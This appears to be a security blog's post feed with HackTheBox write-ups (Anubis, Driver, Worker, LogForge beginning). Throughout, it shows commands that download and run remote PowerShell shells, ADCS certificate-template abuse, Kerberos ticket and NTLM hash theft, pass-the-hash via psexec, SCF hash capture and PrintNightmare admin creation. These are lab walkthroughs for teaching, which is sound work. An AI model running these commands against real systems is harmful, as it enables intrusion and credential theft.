KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQB8AGkAZQB4AA==&quot;)shell.ps1 is a simple tcp reverse shell onliner mentioned above already. Download itself in JS file above has been base64 encrypted using pwshPS /home/luka/htb/anubis&amp;gt; $text = &quot;(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.17/shell.ps1&#39;)|iex&quot; PS /home/luka/htb/anubis&amp;gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($text) PS /home/luka/htb/anubis&amp;gt; $EncodedText = [Convert]::ToBase64String($bytes) PS /home/luka/htb/anubis&amp;gt; $EncodedText KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQB8AGkAZQB4AA==Getting RCESo after putting Whatif.omv back to the Earth there’s a callback and we can see that shell was downloaded as well…10.10.11.102 - - [10/Mar/2022:12:11:52 +0000] &quot;GET /jamovi.js HTTP/1.1&quot; 200 561 &quot;http://127.0.0.1:58953/346d1e8b-594f-4084-b832-8a8fc11ab7e0/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) jamovi/6.1.9 Chrome/76.0.3809.146 Electron/6.1.9 Safari/537.36&quot;10.10.11.102 - - [10/Mar/2022:12:11:56 +0000] &quot;GET /shell.ps1 HTTP/1.1&quot; 200 762 &quot;-&quot; &quot;-&quot;10.10.11.102 - - [10/Mar/2022:12:11:56 +0000] &quot;GET /shell.ps1 HTTP/1.1&quot; 200 762 &quot;-&quot; &quot;-&quot;… followed by code executionWHOAMI = diegocruzSo we’Re diegocruz, medium mandatory level (not an admin) and member of some webdevelopers group.No special Privileges assignedPS C:\\Windows\\system32&amp;gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ============================== ========SeMachineAccountPrivilege Add workstations to domain DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledGetting root on earth machineADCS EnumerationSo we know there are AD Certificate Services running on the machine. We’ve also seen CertEnroll Share so let’s check it.PS C:\\Users\\diegocruz\\Desktop&amp;gt; cd \\\\earth\\\\CertEnrollPS Microsoft.PowerShell.Core\\FileSystem::\\\\earth\\CertEnroll&amp;gt; dir Directory: \\\\earth\\CertEnrollMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/24/2021 7:58 PM 897 earth.windcorp.htb_windcorp-CA.crt -a---- 2/25/2021 10:24 PM 885 earth.windcorp.thm_windcorp-EARTH-CA.crt -a---- 5/25/2021 10:03 PM 322 nsrev_windcorp-CA.asp -a---- 4/28/2021 12:11 AM 328 nsrev_windcorp-EARTH-CA.asp -a---- 3/9/2022 4:42 PM 722 windcorp-CA+.crl -a---- 3/9/2022 4:42 PM 910 windcorp-CA.crl -a---- 5/24/2021 7:28 PM 734 windcorp-EARTH-CA+.crl -a---- 5/19/2021 7:54 PM 928 windcorp-EARTH-CA.crl At this point, recommended reading: https://posts.specterops.io/certified-pre-owned-d95910965cd2I knew this post already beforehand and i also recommend following “SpectreOps” Posts/Tweets.Our tool of choice will be Certify from here: https://github.com/GhostPack/CertifyChecking the post or the github page of the tool (Readme.md) we do see that there are plenty of commands and/or misconfigurations related to ADCS.After enumerating a bit and runningCertify.exe find /vulnerable /currentuserI’ve noticed that the group which we are member of, does have All Extended Rights privileges on Enrollment Permissions and Write permissions on the Web Template Object.CA Name : earth.windcorp.htb\\windcorp-CA Template Name : Web Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : PUBLISH_TO_DS Authorized Signatures Required : 0 pkiextendedkeyusage : Server Authentication mspki-certificate-application-policy : Server Authentication Permissions Enrollment Permissions Enrollment Rights : WINDCORP\\Domain Admins S-1-5-21-3510634497-171945951-3071966075-512 WINDCORP\\Enterprise Admins S-1-5-21-3510634497-171945951-3071966075-519 All Extended Rights : WINDCORP\\webdevelopers S-1-5-21-3510634497-171945951-3071966075-3290 Object Control Permissions Owner : WINDCORP\\Administrator S-1-5-21-3510634497-171945951-3071966075-500 Full Control Principals : WINDCORP\\webdevelopers S-1-5-21-3510634497-171945951-3071966075-3290 WriteOwner Principals : WINDCORP\\Administrator S-1-5-21-3510634497-171945951-3071966075-500 WINDCORP\\Domain Admins S-1-5-21-3510634497-171945951-3071966075-512 WINDCORP\\Enterprise Admins S-1-5-21-3510634497-171945951-3071966075-519 WINDCORP\\webdevelopers S-1-5-21-3510634497-171945951-3071966075-3290 WriteDacl Principals : WINDCORP\\Administrator S-1-5-21-3510634497-171945951-3071966075-500 WINDCORP\\Domain Admins S-1-5-21-3510634497-171945951-3071966075-512 WINDCORP\\Enterprise Admins S-1-5-21-3510634497-171945951-3071966075-519 WINDCORP\\webdevelopers S-1-5-21-3510634497-171945951-3071966075-3290 WriteProperty Principals : WINDCORP\\Administrator S-1-5-21-3510634497-171945951-3071966075-500 WINDCORP\\Domain Admins S-1-5-21-3510634497-171945951-3071966075-512 WINDCORP\\Enterprise Admins S-1-5-21-3510634497-171945951-3071966075-519 WINDCORP\\webdevelopers S-1-5-21-3510634497-171945951-3071966075-3290ADCS Full Rights over Template Abuse.Having All Extended Rights or WriteDacl permissions on AD objects is pretty significant.Now checking the https://posts.specterops.io/certified-pre-owned-d95910965cd2 post again, we can see where we’re at: Misconfigured Certificate Templates — ESC1 …An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users. Having certificate enrollment rights allows a low-privileged attacker to request and obtain a certificate based on the template. Enrollment rights are granted via the certificate template AD object’s security descriptor…Flag ENROLLEE_SUPPLIES_SUBJECT on msPKI-Certificate-Name-Flag is set as well, as it should be, checking the Whitepaper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) on page 59.There is one catch - mspki-certificate-application-policy says Server Authentication. Having Full control over the Template, this can be changed. Checking the Spectreops post there’s a reference to: https://elkement.wordpress.com/2019/06/01/sizzle-hackthebox-unintended-getting-a-logon-smartcard-for-the-domain-admin-2/To change the AD Object’s properties we’d need a distinguishedname. In google the Search Base is not hard to find.PS C:\\Windows\\Tasks&amp;gt; get-domainobject -searchbase &quot;CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb&quot; usncreated : 4133 name : Certificate Templates whenchanged : 2/25/2021 9:08:28 PM objectclass : {top, container} showinadvancedviewonly : True usnchanged : 4133 dscorepropagationdata : {5/24/2021 5:27:58 PM, 1/1/1601 12:00:02 AM} cn : Certificate Templates distinguishedname : CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb whencreated : 2/25/2021 9:08:28 PM instancetype : 4 objectguid : 3d8a891b-1256-4197-9aae-857c35e74659 objectcategory : CN=Container,CN=Schema,CN=Configuration,DC=windcorp,DC=htb mspki-enrollment-flag : 8 mspki-certificate-name-flag : 1 pkidefaultcsps : {2,Microsoft DH SChannel Cryptographic Provider, 1,Microsoft RSA SChannel Cryptographic Provider} distinguishedname : CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb pkidefaultkeyspec : 1 objectclass : {top, pKICertificateTemplate} displayname : Web name : Web mspki-certificate-application-policy : 1.3.6.1.5.5.7.3.1 pkiextendedkeyusage : 1.3.6.1.5.5.7.3.1 Changing ACL Properties for Certificate Templates AD objectSo, let us change the properties from 1.3.6.1.5.5.7.3.1 to &quot;1.3.6.1.5.5.7.3.2&quot;, &quot;1.3.6.1.4.1.311.20.2.2&quot;$rights=@(&quot;1.3.6.1.5.5.7.3.2&quot;, &quot;1.3.6.1.4.1.311.20.2.2&quot;, &quot;1.3.6.1.5.2.3.4&quot;)Set-ADObject &quot;CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb&quot; -Add @{pKIExtendedKeyUsage=$rights;&quot;msPKI-Certificate-Application-Policy&quot;=$rights}# OR ReplaceSet-ADObject -Identity &quot;CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb&quot; -Replace @{&quot;pKIExtendedKeyUsage&quot;=$rights;&quot;msPKI-Certificate-Application-Policy&quot;=$rights}Check.\\Certify.exe find /vulnerable /currentuser...CLIP... pkiextendedkeyusage : Client Authentication, Server Authentication, Smart Card Logon mspki-certificate-application-policy : Client Authentication, Server Authentication, Smart Card Logon...CLIP...Requesting Certificate for Administrator with diegocruzSo Properties have been changed, now we should be able to grab a certificate for Administrator as this user is in Domain Admins group. _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ &#39;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0 [*] Action: Request a Certificates [*] Current user context : WINDCORP\\diegocruz [*] No subject name specified, using current context as subject. [*] Template : Web [*] Subject : CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb[*] AltName : Administrator [*] Certificate Authority : earth.windcorp.htb\\windcorp-CA [*] CA Response : The certificate had been issued.Save the cert.pem part and convert using openssl on Kali/attackers-boxopenssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfxMake it readablechmod +r /var/www/html/cert.pfxCopy to Anubis Boxpowershell iwr http://10.10.14.6/cert.pfx -o cert.pfxMake sure to grab newer version of RubeusPS C:\\Windows\\Tasks&amp;gt; .\\Rubeus2.exe asktgt /user:Administrator /certificate:cert.pfx.\\Rubeus2.exe asktgt /user:Administrator /certificate:cert.pfx ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.6.0 [*] Action: Ask TGT[*] Using PKINIT with etype rc4_hmac and subject: CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: &#39;windcorp.htb\\Administrator&#39;[+] TGT request successful![*] base64(ticket.kirbi): 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 ServiceName : krbtgt/windcorp.htb ServiceRealm : WINDCORP.HTB UserName : Administrator UserRealm : WINDCORP.HTB StartTime : 3/14/2022 4:32:33 PM EndTime : 3/15/2022 2:32:33 AM RenewTill : 3/21/2022 4:32:33 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : rc4_hmac Base64(key) : Vcb75RD6BBBAkFnduOhtEQ==So we’ve got TGT… we can now get Administrator hashPS C:\\Windows\\Tasks&amp;gt; .\\Rubeus3.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Ask TGT[*] Using PKINIT with etype rc4_hmac and subject: CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: &#39;windcorp.htb\\Administrator&#39;[*] Using domain controller: fe80::e14a:3283:eeca:a06f%12:88[+] TGT request successful![*] base64(ticket.kirbi): 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 ServiceName : krbtgt/windcorp.htb ServiceRealm : WINDCORP.HTB UserName : Administrator UserRealm : WINDCORP.HTB StartTime : 3/14/2022 6:13:08 PM EndTime : 3/15/2022 4:13:08 AM RenewTill : 3/21/2022 6:13:08 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : rc4_hmac Base64(key) : oOMgkwH+q+tnbvLE700kPA== ASREP (key) : 317D3212FF750F7A74A404A6AF60B249[*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : 3CCC18280610C6CA3156F995B5899E09Getting Root using psexecSince we’ve got Hash of Administrator which is domain admin, we can try using it using psexec.py:luka@kali:~/htb/anubis$ psexec.py -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102 cmd.exeImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on 10.10.11.102.....[*] Found writable share ADMIN$[*] Uploading file UVxKjrNu.exe[*] Opening SVCManager on 10.10.11.102.....[*] Creating service Iiyl on 10.10.11.102.....[*] Starting service Iiyl.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.2114](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;The End!Awesome box!PS: Make sure you’re using latest Rubeus and Certify as those were upgraded not so long ago!" }, { "title": "Driver", "url": "/posts/Driver/", "categories": "HackTheBox, Windows", "tags": "Windows, Printer, PrintNightmare", "date": "2021-12-25 10:33:00 +0100", "snippet": "Driver is Windows box which introduces common vulnerability/configuration that may be exploited by attackers. In particular it’s about SCF fileEnumerationNMAPNmap scan report for 10.10.11.106Host is up (0.048s latency).Not shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2021-12-27T03:51:27|_ start_date: 2021-12-27T00:53:05| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_clock-skew: mean: 7h02m15s, deviation: 0s, median: 7h02m14sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 153.43 secondsWebPage on Port 80So apparently, the user’s username is admin, so let’s try with password admin….And we’re inWe do have an upload option, so let’s check thatChecking the source confirms thatExploitationWeaponize the Payloadluka@kali:~/htb/driver$ cat share.scf[Shell]Command=2IconFile=\\\\10.10.14.18\\share\\pentestlab.ico[Taskbar]Command=ToggleDesktopStart Respondersudo responder -I tun1tony::DRIVER:9f5260851ec10f7a:6890F0436DABE3FD3939522E624EF1AD:0101000000000000000243F1A4FAD7013E503849182A52FF0000000002000800450039003400410001001E00570049004E002D00560047005A003300440050005800320048005A00570004003400570049004E002D00560047005A003300440050005800320048005A0057002E0045003900340041002E004C004F00430041004C000300140045003900340041002E004C004F00430041004C000500140045003900340041002E004C004F00430041004C0007000800000243F1A4FAD70106000400020000000800300030000000000000000000000000200000B6FE67041FC0497A7ACBB33D27DDED29E05FBEC39AB03DF4B0143F77C15A82070A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003800000000000000000000000000Crack the HashUsing netcat.\\hashcat.exe -m 5600 -a 0 hash.txt .\\rockyou.txt --forceWinRM to the boxluka@kali:~$ /home/luka/tools/evil-winrm/evil-winrm.rb -u tony -p liltony -i 10.10.11.106Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; whoamidriver\\tony*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ==================================== =======SeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeUndockPrivilege Remove computer from docking station EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone EnabledPrivilege EscalationGreat help was this site: https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.htmlPrintNightmare EnumerationLet’s check 2 things: RPC and SMB access using tony’s user.luka@kali:~/htb/driver$ rpcclient -U &#39;tony%liltony&#39; 10.10.11.106 rpcclient $&amp;gt; So RPC - Check!SMB?luka@kali:~/htb/driver$ smbmap -H 10.10.11.106 -u tony -p liltony[+] IP: 10.10.11.106:445 Name: 10.10.11.106 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC… Check. We do have SMB access with tony/liltonyRCP can be checked with rpccheck.py as wellluka@kali:~$ rpcdump.py @10.10.11.106 | grep MS-RPRNProtocol: [MS-RPRN]: Print System Remote ProtocolPrintNightmare ExploitationInvoke-Nightmare(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.18/Invoke-Nightmare.ps1&#39;) | IEXUse Invoke-Nightmare to create user which will be added to Administrators group*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; Invoke-Nightmare -NewUser &quot;luka&quot; -NewPassword &quot;Password01!&quot;[+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll[+] using pDriverPath = &quot;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll&quot;[+] added user luka as local administrator[+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dllSo you can see, there i am - my user as Admin*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; net localgroup AdministratorsAlias name AdministratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------AdministratorlukaThe command completed successfully.So that’s it - we can login using our new user and grab a flag." }, { "title": "Worker", "url": "/posts/Worker/", "categories": "HackTheBox, Linux", "tags": "Linux, SVN, Azure, Apache Subversion, Azure DevOps, DevOps", "date": "2021-12-25 10:33:00 +0100", "snippet": "Worker - Easy Box running on Linux. Enumeration through SVN. DevOps on Azure! :)ENUMERATIONNMAPLet’s start NMAP first:Nmap scan report for 10.10.10.203Host is up (0.034s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION3690/tcp open svnserve SubversionRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jan 17 12:24:15 2021 -- 1 IP address (1 host up) scanned in 13.09 secondsThere is also port 80 running but for some reason didn’t get scanned by NMAP. It’s however nothing there so let’s enumerate that SVN (subversion)SVNluka@kali:~/htb/worker$ nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 10.10.10.203Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 12:31 CETNmap scan report for 10.10.10.203Host is up (0.034s latency).PORT STATE SERVICE3690/tcp open svn| svn-brute: |_ Anonymous SVN detected, no authentication neededNmap done: 1 IP address (1 host up) scanned in 11.81 secondsSubversion is repository like Github commit history just simpler and running on Apache. Link https://en.wikipedia.org/wiki/Apache_SubversionSo let’s see what we can find:svn ls svn://10.10.10.203/So let’s read the moved.txtEXPLOITATIONSVN Enumeration (continued)Add devops.worker.htb to /etc/hosts and try to connect:Without any password we cannot continue. There is also dimension.worker.htb but is just a static page.Since SVN lets us see if there are any older versions let’s do that (usinf -r 1)We can download those with checkout using -r argumentsvn checkout -r 2 svn://10.10.10.203There were some credentials found in deploy.ps1Using that credentials we can login to devops.worker.htbAzure Dev OpsEnumeration didn’t bring much apart from finding more than repos in SmartHotel360 ProjectThere is a way to inject shell (aspx) to the repo and call that file available on that particular subdomain(alpha, spectral,…).So let’s upload shell:And commitCreate pull requestI had to add some work items (just randomly typing them) otherwise “complete didn’t work”If everything worked correctly, we should see the file (remember to visit the right repository!) curl http://spectral.worker.htb/win-rev-shell.aspxShell was poppedPRIVILEGE ESCALATIONManual EnumerationAs expected it is low privileged shell with some privileges!c:\\windows\\system32\\inetsrv&amp;gt;whoamiwhoamiiis apppool\\defaultapppoolc:\\windows\\system32\\inetsrv&amp;gt;whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledI didn’t try different potatoes (rogue,Juicy) since that is usualy unintended way to escalate privileges.There is other share on the systemAfter searching for a while following file was foundList of usernames/passwords was downloaded and will be used in test with crackmapexecs winrm module. I is slow but it works! :)cat credz | tr -d &quot; &quot; | awk -F&quot;=&quot; &#39;{print &quot;crackmapexec winrm 10.10.10.203 -u &quot;$1 &quot; -p &quot;$2 &quot; --local-auth -x whoami&quot;}&#39;The user that worked with that password spray attempt done above was robinslThere is not much that that user can do on the system but his credentials work for devops and it seems to have another project assigned.Azure Dev Ops #2Privilege escalation seems that has to be done almost same attack through Azure Dev Ops it will however be different. I couldn’t find a way to interact with repos directly like before but there is another way to execute code - through pipelines.Azure Repos Git &amp;gt; PartsUnlimited &amp;gt; Starter PipelineHere we can add commands that will be triggered with whichever user has run the service (hopefully SYSTEM ;) ). I’ve decided to add robinsl to administrators group since it is more persistent way of escalating the privileges as reverse shell.then delete pool and create a new branch. If everything has worked correctly user robinsl should have been added to “adminstrators” localgroup.And yes. It has worked!" }, { "title": "LogForge", "url": "/posts/LogForge/", "categories": "HackTheBox, Linux", "tags": "Web Application, Log4j, Linux, Nginx, Path Normalization", "date": "2021-12-25 10:33:00 +0100", 